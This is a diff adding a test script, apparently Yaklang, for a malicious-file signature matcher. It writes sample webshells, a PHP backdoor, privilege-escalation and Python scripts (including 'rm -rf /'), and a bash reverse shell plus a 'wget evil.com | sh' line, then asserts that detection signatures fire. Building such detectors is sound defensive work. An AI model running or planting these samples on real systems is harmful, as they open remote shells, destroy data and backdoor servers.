@@ -1,0 +1,213 @@
+// 恶意文件特征匹配测试
+// 测试功能：基于特征库匹配文件内容特征，检测恶意文件（提权脚本、木马等）
+
+// 创建临时测试目录
+tempBase = os.TempDir()
+testDir = file.Join(tempBase, sprintf("file_malicious_match_test_%d", time.Now().Unix()))
+err = file.MkdirAll(testDir)
+assert err == nil, sprintf("Failed to create temp dir: %v", err)
+defer file.Remove(testDir)
+
+// 1. 测试 PHP WebShell 特征匹配（文件路径）
+println("=== Testing PHP WebShell detection (file path) ===")
+phpWebShell = `<?php
+eval($_POST['cmd']);
+system($_GET['exec']);
+base64_decode($_POST['data']);
+?>`
+
+phpFile = file.Join(testDir, "webshell.php")
+file.Save(phpFile, phpWebShell)
+
+matches, err = file.MatchMalicious(phpFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+assert len(matches) > 0, sprintf("Should match PHP webshell patterns, got: %d", len(matches))
+println(sprintf("PHP WebShell matches: %v", matches))
+
+// 验证匹配到的特征
+assert "php_webshell_eval" in matches, "Should match php_webshell_eval"
+assert "php_webshell_system" in matches, "Should match php_webshell_system"
+assert "php_webshell_base64_decode" in matches, "Should match php_webshell_base64_decode"
+
+// 2. 测试 PHP WebShell 特征匹配（内容）
+println("=== Testing PHP WebShell detection (content) ===")
+content = file.ReadFile(phpFile)
+matches2, err = file.MatchMalicious(content)
+assert err == nil, sprintf("Failed to match content: %v", err)
+assert len(matches2) > 0, sprintf("Should match PHP webshell patterns, got: %d", len(matches2))
+println(sprintf("Content matches: %v", matches2))
+
+// 验证两种方式结果一致
+assert len(matches) == len(matches2), "File and content matching should produce same results"
+
+// 3. 测试提权脚本特征匹配
+println("=== Testing privilege escalation detection ===")
+privilegeScript = `#!/bin/bash
+chmod 777 /tmp/backdoor
+sudo whoami
+cat /etc/passwd
+`
+
+privilegeFile = file.Join(testDir, "privilege.sh")
+file.Save(privilegeFile, privilegeScript)
+
+matches3, err = file.MatchMalicious(privilegeFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+assert len(matches3) > 0, sprintf("Should match privilege escalation patterns, got: %d", len(matches3))
+println(sprintf("Privilege escalation matches: %v", matches3))
+
+// 验证匹配到的特征
+assert "privilege_escalation_chmod_777" in matches3, "Should match chmod 777"
+assert "privilege_escalation_passwd_access" in matches3, "Should match /etc/passwd access"
+
+// 4. 测试后门特征匹配
+println("=== Testing backdoor detection ===")
+backdoorCode = `<?php
+$password = "admin123";
+if ($_POST['pass'] == $password) {
+    @eval($_POST['cmd']);
+}
+login_bypass();
+?>`
+
+backdoorFile = file.Join(testDir, "backdoor.php")
+file.Save(backdoorFile, backdoorCode)
+
+matches4, err = file.MatchMalicious(backdoorFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+assert len(matches4) > 0, sprintf("Should match backdoor patterns, got: %d", len(matches4))
+println(sprintf("Backdoor matches: %v", matches4))
+
+// 验证匹配到的特征
+assert "backdoor_password_hardcoded" in matches4, "Should match hardcoded password"
+assert "backdoor_hidden_eval" in matches4, "Should match hidden eval"
+
+// 5. 测试 Python 恶意脚本特征匹配
+println("=== Testing Python malicious script detection ===")
+pythonMalicious = `import os
+import subprocess
+
+os.system("rm -rf /")
+subprocess.call(["whoami"])
+eval("__import__('os').system('id')")
+`
+
+pythonFile = file.Join(testDir, "malicious.py")
+file.Save(pythonFile, pythonMalicious)
+
+matches5, err = file.MatchMalicious(pythonFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+assert len(matches5) > 0, sprintf("Should match Python malicious patterns, got: %d", len(matches5))
+println(sprintf("Python malicious matches: %v", matches5))
+
+// 验证匹配到的特征
+assert "python_os_system" in matches5, "Should match python_os_system"
+assert "python_subprocess" in matches5, "Should match python_subprocess"
+assert "python_eval_exec" in matches5, "Should match python_eval_exec"
+
+// 6. 测试 Shell 恶意脚本特征匹配
+println("=== Testing Shell malicious script detection ===")
+shellMalicious = `#!/bin/bash
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+wget http://evil.com/script.sh | sh
+`
+
+shellFile = file.Join(testDir, "malicious.sh")
+file.Save(shellFile, shellMalicious)
+
+matches6, err = file.MatchMalicious(shellFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+assert len(matches6) > 0, sprintf("Should match Shell malicious patterns, got: %d", len(matches6))
+println(sprintf("Shell malicious matches: %v", matches6))
+
+// 验证匹配到的特征
+assert "shell_bash_reverse" in matches6, "Should match shell_bash_reverse"
+assert "shell_wget_pipe" in matches6, "Should match shell_wget_pipe"
+
+// 7. 测试正常文件（不应该匹配）
+println("=== Testing normal file (should not match) ===")
+normalFile = file.Join(testDir, "normal.php")
+normalContent = `<?php
+function hello() {
+    echo "Hello World";
+}
+?>`
+file.Save(normalFile, normalContent)
+
+matches7, err = file.MatchMalicious(normalFile)
+assert err == nil, sprintf("Failed to match file: %v", err)
+println(sprintf("Normal file matches: %v (should be empty or minimal)", matches7))
+// 正常文件可能也会匹配一些低风险特征，但不应该匹配高危特征
+
+// 8. 测试详细信息匹配（文件路径）
+println("=== Testing detailed matching (file path) ===")
+details1, err = file.MatchMaliciousWithDetails(phpFile)
+assert err == nil, sprintf("Failed to match with details: %v", err)
+assert len(details1) > 0, sprintf("Should have detailed matches, got: %d", len(details1))
+
+for detail in details1 {
+    assert detail["name"] != "", "Detail should have name"
+    assert detail["category"] != "", "Detail should have category"
+    assert detail["severity"] != "", "Detail should have severity"
+    assert detail["description"] != "", "Detail should have description"
+    println(sprintf("Detail: %s, Category: %s, Severity: %s", 
+        detail["name"], detail["category"], detail["severity"]))
+}
+
+// 9. 测试详细信息匹配（内容）
+println("=== Testing detailed matching (content) ===")
+content2 = file.ReadFile(phpFile)
+details2, err = file.MatchMaliciousWithDetails(content2)
+assert err == nil, sprintf("Failed to match with details: %v", err)
+assert len(details2) > 0, sprintf("Should have detailed matches, got: %d", len(details2))
+
+// 验证两种方式结果一致
+assert len(details1) == len(details2), "File and content detailed matching should produce same results"
+
+// 10. 测试自定义匹配器
+println("=== Testing custom matcher ===")
+matcher = file.NewMaliciousFileMatcher()
+
+// 添加自定义特征
+customSig = {
+    "name": "custom_suspicious_pattern",
+    "category": "custom",
+    "pattern": "suspicious_function",
+    "description": "自定义可疑函数",
+    "severity": "medium"
+}
+err = matcher.AddSignature(customSig)
+assert err == nil, sprintf("Failed to add custom signature: %v", err)
+
+// 创建包含自定义特征的测试文件
+customFile = file.Join(testDir, "custom.php")
+file.Save(customFile, "<?php suspicious_function(); ?>")
+
+matches8 = matcher.MatchFile(customFile)
+println(matches8)
+assert len(matches8) > 0, sprintf("Should match custom pattern, got: %d", len(matches8))
+assert "custom_suspicious_pattern" in matches8[0], "Should match custom_suspicious_pattern"
+println(sprintf("Custom matcher matches: %v", matches8))
+
+// 11. 测试按分类获取特征
+println("=== Testing get signatures by category ===")
+phpSigs = matcher.GetSignaturesByCategory("php_webshell")
+assert len(phpSigs) > 0, sprintf("Should have PHP webshell signatures, got: %d", len(phpSigs))
+println(sprintf("PHP WebShell signatures count: %d", len(phpSigs)))
+
+privilegeSigs = matcher.GetSignaturesByCategory("privilege_escalation")
+assert len(privilegeSigs) > 0, sprintf("Should have privilege escalation signatures, got: %d", len(privilegeSigs))
+println(sprintf("Privilege escalation signatures count: %d", len(privilegeSigs)))
+
+// 12. 测试所有分类
+println("=== Testing get all categories ===")
+categories = matcher.GetAllCategories()
+assert len(categories) > 0, sprintf("Should have categories, got: %d", len(categories))
+println(sprintf("All categories: %v", categories))
+
+assert "php_webshell" in categories, "Should have php_webshell category"
+assert "privilege_escalation" in categories, "Should have privilege_escalation category"
+assert "backdoor" in categories, "Should have backdoor category"
+
+println("File malicious match tests passed!")
+
